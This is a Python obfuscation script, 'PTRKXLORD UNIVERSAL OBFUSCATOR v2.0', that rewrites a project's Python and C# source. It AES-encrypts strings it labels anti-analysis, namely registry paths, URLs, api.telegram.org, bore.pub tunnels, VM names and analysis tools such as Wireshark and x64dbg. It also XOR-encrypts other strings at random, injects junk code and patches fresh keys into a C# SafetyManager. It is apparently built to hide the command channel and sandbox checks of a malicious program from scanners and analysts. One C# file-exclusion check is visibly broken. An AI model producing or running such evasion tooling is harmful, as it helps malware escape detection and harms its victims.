import os
import re
import base64
import random
import string
import sys
from Crypto.Cipher import AES
from Crypto.Util import Counter

# Configuration
CORE_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "core"))
DEFENSE_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "defense"))
TARGET_DIRS = ["core", "defense", "native_modules"]
TARGET_FILES = ["main.py"]

# Anti-analysis strings (URLs, IPs, Registry, Tools)
SENSITIVE_PATTERNS = [
    r"SYSTEM\\CurrentControlSet.*",
    r"SOFTWARE\\Microsoft\\Windows.*",
    r"http[s]?://.*",
    r"api\.telegram\.org",
    r"bore\.pub",
    r"vmware", r"virtualbox", r"vbox", r"qemu",
    r"wireshark", r"fiddler", r"procmon", r"x64dbg",
]

def generate_key(length=32):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length)).encode()

NEW_SALT = generate_key(16)
NEW_AES_KEY = generate_key(32)

def patch_modules():
    # Patch Python obfuscation.py
    obfs_py = os.path.join(CORE_PATH, "obfuscation.py")
    if os.path.exists(obfs_py):
        with open(obfs_py, "r", encoding="utf-8") as f:
            content = f.read()
        content = re.sub(r'# SALT_PLACEHOLDER\n\s+return b".*?"', f'# SALT_PLACEHOLDER\n    return {repr(NEW_SALT)}', content)
        content = re.sub(r'# AES_KEY_PLACEHOLDER\n\s+return b".*?"', f'# AES_KEY_PLACEHOLDER\n    return {repr(NEW_AES_KEY)}', content)
        with open(obfs_py, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] Patched Python obfuscation.py")

    # Patch C# SafetyManager.cs
    SafetyManager_cs = os.path.join(DEFENSE_PATH, "SafetyManager.cs")
    if os.path.exists(SafetyManager_cs):
        with open(SafetyManager_cs, "r", encoding="utf-8") as f:
            content = f.read()
        
        # Patch AES_KEY and XOR_SALT placeholders in C#
        aes_key_str = NEW_AES_KEY.decode('utf-8')
        xor_salt_str = NEW_SALT.decode('utf-8')
        content = re.sub(r'Encoding\.UTF8\.GetBytes\("AES_KEY_PLACEHOLDER"\)', f'Encoding.UTF8.GetBytes("{aes_key_str}")', content)
        content = re.sub(r'Encoding\.UTF8\.GetBytes\("XOR_SALT_PLACEHOLDER"\)', f'Encoding.UTF8.GetBytes("{xor_salt_str}")', content)
        
        with open(SafetyManager_cs, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] Patched C# SafetyManager.cs with synchronized Keys/Salts.")

def encrypt_aes(plain_str: str) -> str:
    iv = os.urandom(16)
    cipher = AES.new(NEW_AES_KEY, AES.MODE_CBC, iv=iv)
    data = plain_str.encode('utf-8')
    # PKCS7 padding
    padding_len = 16 - (len(data) % 16)
    data += bytes([padding_len] * padding_len)
    ct = cipher.encrypt(data)
    return base64.b64encode(iv + ct).decode('utf-8')

def encrypt_xor(plain_str: str) -> str:
    data = plain_str.encode('utf-8')
    xor_data = bytearray()
    for i in range(len(data)):
        xor_data.append(data[i] ^ NEW_SALT[i % len(NEW_SALT)])
    return base64.b64encode(xor_data).decode('utf-8')

def get_cs_bytes(plain_str: str) -> str:
    # Use randomized NEW_SALT for C# to match DStr
    data = plain_str.encode('utf-8')
    bytes_list = []
    for i in range(len(data)):
        bytes_list.append(f"0x{data[i] ^ NEW_SALT[i % len(NEW_SALT)]:02x}")
    bytes_str = ", ".join(bytes_list)
    return f"new byte[] {{ {bytes_str} }}"

def inject_junk_python():
    junk_templates = [
        "if {0} > {1}: {2} = {0} * {1}",
        "for _ in range({0}): pass",
        "def _tmp_{0}(): return {1}",
        "var_{0} = '{1}'[::-1]"
    ]
    t = random.choice(junk_templates)
    return t.format(random.randint(1, 100), random.randint(1, 100), "".join(random.choice(string.ascii_lowercase) for _ in range(5)))

def process_python(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    
    def replacer(match):
        full_match = match.group(0)
        start_index = match.start()
        
        # Check if the match is preceded by 'decrypt_string(' or 'decrypt_aes('
        # We look back in the content string
        lookback = content[max(0, start_index-20):start_index]
        if "decrypt_string(" in lookback or "decrypt_aes(" in lookback:
            return full_match

        prefix = match.group(1) or ""
        quote = match.group(2)
        s = match.group(3)
        if prefix.lower() in ("f", "r", "b", "u") or len(s) < 4:
            return full_match
        
        is_sensitive = any(re.search(p, s, re.IGNORECASE) for p in SENSITIVE_PATTERNS)
        if is_sensitive:
            return f"decrypt_aes('{encrypt_aes(s)}')"
        elif random.random() < 0.3: # Randomly obfuscate 30% of other strings
            return f"decrypt_string('{encrypt_xor(s)}')"
        return full_match

    # Robust Python string regex: handles escaped quotes
    new_content = re.sub(r'(\w+)?([\'"])((?:\\.|(?!\2).)*)\2', replacer, content)
    
    # Inject junk code with correct indentation
    lines = new_content.splitlines()
    final_lines = []
    for i, line in enumerate(lines):
        final_lines.append(line)
        if i % 50 == 0 and i > 0 and line.strip() and not line.strip().endswith(":"):
            # Match indentation of current line
            match = re.match(r'^(\s*)', line)
            indent = match.group(1) if match else ""
            final_lines.append(f"{indent}{inject_junk_python()} # dead code")

    with open(file_path, "w", encoding="utf-8") as f:
        f.write("\n".join(final_lines))

def process_csharp(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.readlines()

    def replacer(match):
        if match.group(1): # Verbatim string @""
            return match.group(1) # Skip verbatim
            
        s = match.group(3) # Standard string content
        # Skip small strings or format strings unconditionally
        if len(s) < 4 or "{" in s or "}" in s: 
            return f'"{s}"'
            
        is_sensitive = any(re.search(p, s, re.IGNORECASE) for p in SENSITIVE_PATTERNS)
        
        if is_sensitive:
            return f'SafetyManager.DAes("{encrypt_aes(s)}")'
            
        # 40% chance to XOR encrypt
        if random.random() < 0.4:
            return f"SafetyManager.DStr({get_cs_bytes(s)})"
            
        return f'"{s}"'

    new_lines = []
    
    # We must skip obfuscating strings in certain contexts:
    # 1. Attributes [DllImport("...")]
    # 2. Switch cases: case "...":
    # 3. Const declarations: const string X = "...";
    
    for line in lines:
        stripped = line.strip()
        
        # Safe contexts to skip
        if stripped.startswith('[') or stripped.startswith('case ') or 'const string' in stripped or stripped.startswith('using'):
            new_lines.append(line)
            continue
            
        # Robust C# string regex: matches both verbatim and standard strings, but we only process standard ones
        processed_line = re.sub(r'(@"(?:""|[^"])*")|("((?:\\.|[^\\"])*)")', replacer, line)
        new_lines.append(processed_line)
    final_text = "".join(new_lines)
    if "SafetyManager." in final_text and "using VanguardCore;" not in final_text:
        final_text = "using VanguardCore;\n" + final_text
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(final_text)

def main():
    print("--- PTRKXLORD UNIVERSAL OBFUSCATOR v2.0 ---")
    patch_modules()
    
    for f in TARGET_FILES:
        if os.path.exists(f): process_python(f)
        
    for d in TARGET_DIRS:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for file in files:
                path = os.path.join(root, file)
                if file.endswith(".py") and file != "obfuscation.py":
                    process_python(path)
                elif file.endswith(".cs") and file.lower() != "SafetyManager.cs":
                    process_csharp(path)

    print("[*] Obfuscation Complete!")

if __name__ == "__main__":
    main()
